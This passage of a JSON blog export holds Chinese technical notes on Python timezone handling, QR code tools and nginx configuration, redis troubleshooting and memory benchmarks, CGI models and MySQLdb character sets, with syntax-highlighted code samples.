background-color: #2d2d2d;\"> </span>   }<span style=\"color: #f99157; background-color: #515151;\">        </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">shard</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #6699cc;\">this</span>-&gt;<span style=\"color: #ffcc66;\">shard</span>[<span style=\"color: #66cccc;\">'redis'</span>];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n</pre>\n</div>\n</div>\n</div>\n"
},
{
  "title": "python中的UTC与本地时区处理",
  "timestamp": "2013-03-20 17:29:00",
  "tags": [
    "python"
  ],
  "body": "<p>\n在通过sqlalchemy使用sqlite3数据库的过程中，发现日期时间字段默认值为CURRENT_TIMESTAMP，但是查出的值少了8个小时。很明显是遇到时区问题了。\n</p>\n\n<p>\nmysql的TIMESTAMP字段类型和sqlite3一样使用UTC时间保存，因为在存取时自动进行了本地时间与UTC时间互转，所以不会遇到时区问题。但是sqlite3没有自动进行这一转换，需要在sql中自行转换:\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sql\"><span style=\"color: #99cc99;\">select</span> datetime(<span style=\"color: #cc99cc;\">CURRENT_TIMESTAMP</span>, <span style=\"color: #66cccc;\">'localtime'</span>)\n</pre>\n</div>\n\n<p>\n进一步google后，找到了这篇文章：《<a href=\"http://lucumr.pocoo.org/2011/7/15/eppur-si-muove/\">Dealing with Timezones in Python</a>》，文章大意是python中的datetime库默认不携带时区信息，而加上时区后又与不带时区的datetime对象无法一起工作（如：比较），另外像datetime.datetime.utcnow()返回的utc时间和datetime.datetime.now()返回的本地时间也是不携带时区信息的（tzinfo属性为None），容易引起混淆，因此处理的简单性，内部最好统一使用UTC标准时间，和用户交互时再转换为本地时间。\n</p>\n\n<p>\n下面是互转的算法：\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">/usr/bin/env python</span>\n\n<span style=\"color: #99cc99;\">import</span> datetime\n<span style=\"color: #99cc99;\">import</span> time\n<span style=\"color: #99cc99;\">import</span> sys\n\n<span style=\"color: #99cc99;\">if</span> sys.version &gt;= <span style=\"color: #66cccc;\">'3.2.'</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">localtimezone</span> = datetime.timezone(datetime.timedelta(seconds=-time.timezone)<span style=\"text-decoration: underline;\">, time.tzname[0])</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">utctimezone</span> = datetime.timezone.utc\n<span style=\"color: #99cc99;\">else</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">from</span> dateutil <span style=\"color: #99cc99;\">import</span> tz\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">localtimezone</span> = tz.tzlocal()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">utctimezone</span> = tz.gettz(<span style=\"color: #66cccc;\">'UTC'</span>)\n\n<span style=\"color: #99cc99;\">def</span> <span style=\"color: #f99157;\">parsedatetime</span>(dt, fmt=<span style=\"color: #66cccc;\">\"%Y-%m-%d %H:%M:%S\"</span>):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">\"\"\"parse local datetime string as utc datetime object\"\"\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> datetime.datetime.strptime(dt, fmt).replace(tzinfo=localtimezone).ast<span style=\"text-decoration: underline;\">imezone(utctimezone)</span>\n\n<span style=\"color: #99cc99;\">def</span> <span style=\"color: #f99157;\">formatdatetime</span>(dt, fmt=<span style=\"color: #66cccc;\">\"%Y-%m-%d %H:%M:%S\"</span>):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cc99cc;\">\"\"\"format utc datetime object as local datetime string\"\"\"</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> dt.replace(tzinfo=utctimezone).astimezone(localtimezone).strftime(fmt<span style=\"text-decoration: underline;\">)</span>\n\n<span style=\"color: #99cc99;\">if</span> <span style=\"color: #cc99cc;\">__name__</span> == <span style=\"color: #66cccc;\">'__main__'</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">input_local_datetime</span> = <span style=\"color: #66cccc;\">'2012-01-02 03:04:05'</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">parsed_utc_datetime</span> = parsedatetime(input_local_datetime)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">assert</span>(formatdatetime(parsed_utc_datetime) == input_local_datetime)\n</pre>\n</div>\n"
},
{
  "title": "二维码研究",
  "timestamp": "2013-03-30 11:21:00",
  "tags": [
    "qrcode"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">介绍</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<dl class=\"org-dl\">\n<dt> <a href=\"http://www.itsc.org.sg/pdf/synthesis08/Three_QR_Code.pdf\">Three_QR_Code.pdf</a> </dt><dd>     RFC式的文档\n</dd>\n\n<dt> <a href=\"http://suflow.iteye.com/blog/1100678\">二维码 编码原理简介</a> </dt><dd>     通俗易懂的编码细节介绍\n</dd>\n\n<dt> <a href=\"http://zh.wikipedia.org/wiki/QR%E7%A2%BC\">QR碼 - 维基百科，自由的百科全书</a> </dt><dd>\n</dd>\n\n<dt> <a href=\"http://www.qrstuff.com/blog/2011/11/23/qr-code-minimum-size\">QR Code Minimum Size</a> 与 <a href=\"http://www.qrstuff.com/blog/2011/01/18/what-size-should-a-qr-code-be\">What Size Should A Printed QR Code Be?</a> </dt><dd>     关于可识别性的一些结论，该网站上有大量二维码研究相关的文章\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">二维码开发库</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https://github.com/fukuchi/libqrencode\">libqrencode</a> </dt><dd>     基础的c语言二维码编码库，很多语言基于它开发扩展，不包含生成png图的功能，如需生成png可参考<a href=\"https://github.com/bitly/simplehttp/blob/master/qrencode/qrencode.c\">这里</a>\n</dd>\n<dt> <a href=\"https://github.com/jeromeetienne/jquery-qrcode\">jquery-qrcode</a> </dt><dd>     使用javascript直接在客户端生成二维码，中文支持参见<a href=\"http://suflow.iteye.com/blog/1687396\">JS生成二维码，支持中文字符</a>\n</dd>\n<dt> <a href=\"http://people.freebsd.org/~vanilla/qrencode-0.3.tar.bz2\">php's qrencode extension</a> </dt><dd>     使用nginx的扩展性能会更好一点，参考后面<a href=\"#sec-4\">nginx的相关扩展</a>.\n</dd>\n<dt> <a href=\"http://trac.koka-in.org/libdecodeqr\">libdecodeqr</a> </dt><dd>     二维码解码库\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">二维码生成工具</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https://launchpad.net/qr-code-creator/\">qr-code-creator</a> </dt><dd>     linux下的GUI程序。\n</dd>\n\n<dt> <a href=\"https://npmjs.org/package/qrcode-terminal\">qrcode-terminal</a> </dt><dd>     linux终端下生成并展示二维码，是一个node.js模块，带命令行工具程序，方便使用，介绍文章：<a href=\"http://blog.michaelbrooks.ca/qrcode-terminal/\">QR Code Terminal</a>\n</dd>\n\n<dt> <a href=\"https://github.com/lincolnloop/python-qrcode\">python-qrcode</a> </dt><dd>     linux终端下生成并展示二维码，是一个python包，带命令行工具程序，方便使用。\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">nginx的相关扩展</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n</div><div id=\"outline-container-sec-4-1\" class=\"outline-3\">\n<h3 id=\"sec-4-1\">基本的二维码</h3>\n<div class=\"outline-text-3\" id=\"text-4-1\">\n<p>\n<a href=\"https://github.com/dcshi/ngx_http_qrcode_module\">ngx_http_qrcode_module</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-2\" class=\"outline-3\">\n<h3 id=\"sec-4-2\">二维码个性化水印</h3>\n<div class=\"outline-text-3\" id=\"text-4-2\">\n<p>\nnginx_http_image_filter加上 <a href=\"http://forum.nginx.org/read.php?21,235958\">水印补丁</a> 即可。\n</p>\n\n<p>\n下面的是经过修改后的 <code>nginx image filter</code> 模块代码，加入居中的水印效果:\n</p>\n\n<p>\n<a href=\"../static/ngx_http_image_filter_module.c\">ngx_http_image_filter_module.c</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-3\" class=\"outline-3\">\n<h3 id=\"sec-4-3\">编译</h3>\n<div class=\"outline-text-3\" id=\"text-4-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">--with-debug --with-http_image_filter_module --add-module=/home/tangxinfa/Openso<span style=\"text-decoration: underline;\">urce/nginx-1.2.7/../ngx_http_qrcode_module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_devel_kit/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../set-misc-nginx-module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../echo-nginx-module/</span>\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-4\" class=\"outline-3\">\n<h3 id=\"sec-4-4\">配置</h3>\n<div class=\"outline-text-3\" id=\"text-4-4\">\n<pre class=\"example\">\nlocation ~ /qr {\n    qrcode_fg_color FF0000;\n    qrcode_bg_color FFFFFF;    \n    qrcode_level 2;\n    qrcode_hint 2;\n    qrcode_size 120;\n    qrcode_margin 2;\n    qrcode_version 5;\n    set_unescape_uri $txt $arg_txt;\n    qrcode_txt $txt;\n    qrcode_casesensitive 1; \n    qrcode_gen;  \n\n    image_filter_watermark \"/usr/share/pixmaps/gnome-word.png\";\n    image_filter_watermark_transparency 95; #0-100\n    image_filter watermark;\n}\n</pre>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4-5\" class=\"outline-3\">\n<h3 id=\"sec-4-5\">访问</h3>\n<div class=\"outline-text-3\" id=\"text-4-5\">\n<pre class=\"example\">\nhttp://localhost:8080/qr?txt=hello\n</pre>\n<ul class=\"org-ul\">\n<li>显示效果：\n</li>\n</ul>\n\n<div class=\"figure\">\n<p><img src=\"../static/hello_qr.png\" alt=\"hello_qr.png\" />\n</p>\n</div>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">二维码基础服务的一点思索</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li>必须建立在cdn的基础上\n</li>\n<li>用户只需按照约定将内容以及定制参数按照直观的方式编码成二维码图片链接即可\n</li>\n</ul>\n\n<p>\n参考：<a href=\"https://developers.google.com/chart/infographics/docs/qr_codes\">https://developers.google.com/chart/infographics/docs/qr_codes</a></p>\n</div>\n</div>\n"
},
{
  "title": "解决保存快照失败后redis无法写入的问题",
  "timestamp": "2012-12-16 15:14:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n用命令行工具连上后执行“set test 0”出现以下错误提示：\n</p>\n<pre class=\"example\">\nMISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.\n</pre>\n<p>\n这个应该是之前强制停止redis快照导致的，查看redis快照状态证实了这一点：\n</p>\n<pre class=\"example\">\nredis 127.0.0.1:6379&gt; info\n...\nrdb_last_bgsave_status:err\n...\n</pre>\n<p>\n通过关闭配置项stop-writes-on-bgsave-error解决该问题。\n</p>\n<pre class=\"example\">\nredis 127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no\n</pre>\n"
},
{
  "title": "使用hash表结构减少redis内存占用",
  "timestamp": "2012-12-16 15:14:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n当hash结构中的元素较少（少于redis.conf:hash-max-zipmap-entries指定的数量时，配置成&lt;=1000，过大会减低处理速度，参见： <a href=\"http://stackoverflow.com/questions/11281734/redis-using-hashes\">这里</a> 和 <a href=\"http://instagram-engineering.tumblr.com/post/12202313862/storing-hundreds-of-millions-of-simple-key-value-pairs\">这里</a> ）且数据为整型时，redis使用特殊的方式（数组保存，时间换空间）保存hash结构以减少内存占用，参见 <a href=\"http://redis.io/topics/memory-optimization\">这里</a> 和 <a href=\"http://stackoverflow.com/questions/9625246/what-are-the-underlying-data-structures-used-for-redis\">这里</a> 。但当hash结构超过指定数量时将使用普通的<a href=\"http://redis.io/commands#string\">字符串</a>方式保存，也就无法再节省内存了。</p>\n"
},
{
  "title": "估算redis内存占用",
  "timestamp": "2012-12-16 15:14:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n参考: <a href=\"http://lethain.com/notes-on-redis-memory-usage/\">Notes on Redis Memory Usage</a>\n</p>\n\n<ul class=\"org-ul\">\n<li>测试环境\n<dl class=\"org-dl\">\n<dt> redis版本 </dt><dd>redis_version:2.4.4\n</dd>\n<dt> 操作系统（uname -a） </dt><dd>Linux CentOS 2.6.32-220.13.1.el6.x86_64 #1 SMP Tue Apr 17 23:56:34 BST 2012 x86_64 x86_64 x86_64 GNU/Linux\n</dd>\n<dt> python版本（python &#x2013;version） </dt><dd>Python 2.6.6\n</dd>\n</dl>\n</li>\n</ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">Strings</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>测试脚本\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/env python</span>\n\n<span style=\"color: #99cc99;\">import</span> redis\n<span style=\"color: #99cc99;\">import</span> uuid\n<span style=\"color: #99cc99;\">import</span> time\n\n<span style=\"color: #ffcc66;\">r</span> = redis.Redis(host=<span style=\"color: #66cccc;\">'localhost'</span>, port=6379, db=0)\n<span style=\"color: #99cc99;\">for</span> num_strings <span style=\"color: #99cc99;\">in</span> (100000,):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   r.flushall()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   time.sleep(1.0)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">initial_size</span> = r.dbsize()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">initial_info</span> = r.info()\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span> i <span style=\"color: #99cc99;\">in</span> <span style=\"color: #cc99cc;\">xrange</span>(0, num_strings):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   r.<span style=\"color: #cc99cc;\">set</span>(<span style=\"color: #cc99cc;\">str</span>(uuid.uuid4()), time.time())\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">r.setex(str(uuid.uuid4()), time.time(), 100000)</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">final_size</span> = r.dbsize()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">final_info</span> = r.info()\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"For %s strings.\"</span> % (num_strings,)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"Keys: %s =&gt; %s\"</span> % (initial_size, final_size)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"Memory: %s =&gt; %s\"</span> % (initial_info[<span style=\"color: #66cccc;\">'used_memory'</span>],\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   final_info[<span style=\"color: #66cccc;\">'used_memory'</span>])\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"Memory per key: %d\"</span>%((<span style=\"color: #cc99cc;\">int</span>(final_info[<span style=\"color: #66cccc;\">'used_memory'</span>]) - <span style=\"color: #cc99cc;\">int</span>(initial_in<span style=\"text-decoration: underline;\">fo[</span><span style=\"color: #66cccc; text-decoration: underline;\">'used_memory'</span><span style=\"text-decoration: underline;\">])) / num_strings)</span>\n</pre>\n</div>\n</li>\n<li>测试结果\n<dl class=\"org-dl\">\n<dt> set </dt><dd>每个key-value占用138字节，可见redis本身的维护开销为89字节\n</dd>\n<dt> setex </dt><dd>每个key-value占用180字节，可见redis本身的维护开销为131字节，启用过期时间需要42字节开销（这是因为redis使用新的链表保存设置了过期时间的条目）。\n</dd>\n</dl>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">Sets</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>测试脚本\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/bin/env python</span>\n\n<span style=\"color: #99cc99;\">import</span> redis\n<span style=\"color: #99cc99;\">import</span> math\n<span style=\"color: #99cc99;\">import</span> time\n\n<span style=\"color: #ffcc66;\">r</span> = redis.Redis(host=<span style=\"color: #66cccc;\">'localhost'</span>, port=6379, db=0)\n<span style=\"color: #ffcc66;\">set_capcity</span> = <span style=\"color: #cc99cc;\">int</span>(r.config_get(<span style=\"color: #66cccc;\">\"set-max-intset-entries\"</span>)[<span style=\"color: #66cccc;\">\"set-max-intset-entries</span><span style=\"color: #66cccc; text-decoration: underline;\">\"</span><span style=\"text-decoration: underline;\">])</span>\n\n<span style=\"color: #99cc99;\">def</span> <span style=\"color: #f99157;\">set_name</span>(i, num_strings, set_capcity):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">set_num</span> = math.ceil(num_strings/<span style=\"color: #cc99cc;\">float</span>(set_capcity))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #66cccc;\">\"s%d\"</span>%(i%set_num)\n\n<span style=\"color: #99cc99;\">for</span> num_strings <span style=\"color: #99cc99;\">in</span> (100000,):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   r.flushall()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   time.sleep(1.0)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">initial_size</span> = r.dbsize()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">initial_info</span> = r.info()\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span> i <span style=\"color: #99cc99;\">in</span> <span style=\"color: #cc99cc;\">xrange</span>(0, num_strings):\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">r.sadd(\"s\", str(i))</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   r.sadd(set_name(i, num_strings, set_capcity), <span style=\"color: #cc99cc;\">str</span>(i))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">final_size</span> = r.dbsize()\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">final_info</span> = r.info()\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"For %s strings.\"</span> % (num_strings,)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"Keys: %s =&gt; %s\"</span> % (initial_size, final_size)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"Memory: %s =&gt; %s\"</span> % (initial_info[<span style=\"color: #66cccc;\">'used_memory'</span>],\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   final_info[<span style=\"color: #66cccc;\">'used_memory'</span>])\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">print</span> <span style=\"color: #66cccc;\">\"Memory per key: %d\"</span>%((<span style=\"color: #cc99cc;\">int</span>(final_info[<span style=\"color: #66cccc;\">'used_memory'</span>]) - <span style=\"color: #cc99cc;\">int</span>(initial_in<span style=\"text-decoration: underline;\">fo[</span><span style=\"color: #66cccc; text-decoration: underline;\">'used_memory'</span><span style=\"text-decoration: underline;\">])) / num_strings)</span>\n</pre>\n</div>\n</li>\n\n<li>测试结果\n<dl class=\"org-dl\">\n<dt> 启用压缩 </dt><dd>每个value占用4字节\n</dd>\n<dt> 不启用压缩 </dt><dd>每个value占用39字节\n</dd>\n</dl>\n<p>\n注意: redis的set仅当值为整型，压缩才会生效。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">内存预留</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n除非你能够保证你的机器总是有一半的空闲内存，否则别使用快照方式持久化数据或者通过执行BGREWRITEAOF压缩aof文件。\nredis在执行bgsave时，会进行一次fork，fork后的进程负责将内存中的数据写入磁盘，由于fork采用Copy-On-Write，两个redis进程共享内存中的数据。redis如果有数据更新，则会将对应的共享内存页创建一份副本再更新，当更新操作足够频繁时，共享的内存空间会迅速地副本化，导致物理内存被耗光，系统被迫动用交换空间，从而导致redis服务极不稳定，整个系统堵塞在磁盘io上。</p>\n</div>\n</div>\n"
},
{
  "title": "linux下跨进程传递文件描述符",
  "timestamp": "2013-03-09 15:11:00",
  "tags": [
    "linux"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">问题</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n在web开发中，以典型的php-fpm为例，对于到外部系统的连接（如：mysql、redis）等都提供了持久连接接口（pconnect），但是受限于多进程模型，事实上是每个php-fpm进程都有单独的一个连接池的（参见：《<a href=\"http:5f53-php-90474e0a-redis.html\">当php遇上redis</a>》），大量空闲连接的存在不仅对系统资源造成了浪费（不单指fd空间，像mysql的每连接一线程会附带大量内存空间：sort_buffer、read_buffer等），而且整个系统将无法横向扩展（如：mysql连接数限制）。如果可以在进程间共享文件描述符，将可以大大提升系统性能，促进多进程模型的应用。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">方案</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n在linux平台下，sendmsg、recvmsg可以将一个进程的文件描述符传递给另一进程使用，这使得实现系统级的连接池成为可能。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">实现</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n《The Linux Programming Interface》61.13.3 Passing File Descriptors\n</p>\n</div>\n</div>\n"
},
{
  "title": "Web模型初探",
  "timestamp": "2013-02-28 15:07:00",
  "tags": [
    "web"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">CGI</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n全称为Common Gateway Interface，即公共网关接口。\n当Web服务器收到一个请求时，运行相应的处理程序，相关参数通过标准输入传递给处理程序，处理程序的标准输出做为响应内容，处理程序运行结束后将响应发送给客户端。\n</p>\n\n<ul class=\"org-ul\">\n<li>性能 *\n\n<p>\n进程级，每请求一进程。进程创建有很大的开销，并发数与系统资源消耗呈线性增长，有限的系统资源成为瓶颈。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">FastCGI</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n为CGI的改良，CGI程序做为独立的网络后台程序运行，当Web服务器收到一个请求时，发起一个tcp请求到处理程序，通过该tcp连接传入相关参数，处理程序的响应也通过该tcp连接发回给Web服务器，处理程序关闭该连接表示处理完毕，Web服务器最终将响应发送给客户端。\n</p>\n\n<ul class=\"org-ul\">\n<li>性能 **\n\n<p>\n网络级，每请求一连接。CGI的改良，重用进程，进程处理完一个请求后再处理下一请求，对于多个请求，只需要付出一次进程创建的开销，可以在后继请求重用资源（从文件载入的配置项、查询到的数据、打开的文件、数据库连接等）。因为处理程序是串行处理请求，往往需要同时运行多个处理程序以提升并发处理能力，这些处理程序无法共享资源以进一步提升性能。\n</p>\n</li>\n\n<li>附录\n\n<p>\nWeb服务器可重用到服务程序的连接进一步提升性能（如：nginx的<a href=\"http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive\">upstream_keepalive</a>）。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">WSGI</h2>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">uWSGI</h2>\n</div>\n"
},
{
  "title": "memcached_get会重置过期时间吗？",
  "timestamp": "2012-11-13 20:29:00",
  "tags": [
    "memcached"
  ],
  "body": "<p>\n不会。获取数据的操作不会影响数据的过期时间，最新的memcache1.6添加了touch和GAT（get and touch)命令，可以在获取数据时过期时间。</p>\n"
},
{
  "title": "python中MySQLdb使用utf-8字符集",
  "timestamp": "2011-04-29 01:22:00",
  "tags": [
    "python",
    "mysql"
  ],
  "body": "<dl class=\"org-dl\">\n<dt> 要避免乱码需要做好以下几点 </dt><dd><ul class=\"org-ul\">\n<li>python源代码保存为utf-8\n</li>\n<li>数据库建成utf-8\n</li>\n<li>mysql连接设置为utf-8\n</li>\n<li>查询結果中的文本字段是unicode的，转回utf-8\n</li>\n</ul>\n</dd>\n\n<dt> 总结性的示例代码 </dt><dd><div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">!/usr/bin/env python</span>\n<span style=\"color: #999999; font-style: italic;\">#</span><span style=\"color: #999999; font-style: italic;\">-*- coding: utf-8 -*-</span>\n\n<span style=\"color: #99cc99;\">import</span> MySQLdb\n\n<span style=\"color: #99cc99;\">if</span> <span style=\"color: #cc99cc;\">__name__</span> == <span style=\"color: #66cccc;\">'__main__'</span>:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">mysql</span> = MySQLdb.connect(host=<span style=\"color: #66cccc;\">'localhost'</span>, user=<span style=\"color: #66cccc;\">'root'</span>, passwd=<span style=\"color: #66cccc;\">'123456'</span>, char<span style=\"text-decoration: underline;\">set=</span><span style=\"color: #66cccc; text-decoration: underline;\">'utf8'</span><span style=\"text-decoration: underline;\">)</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #ffcc66;\">cursor</span> = mysql.cursor()\n<span style=\"color: 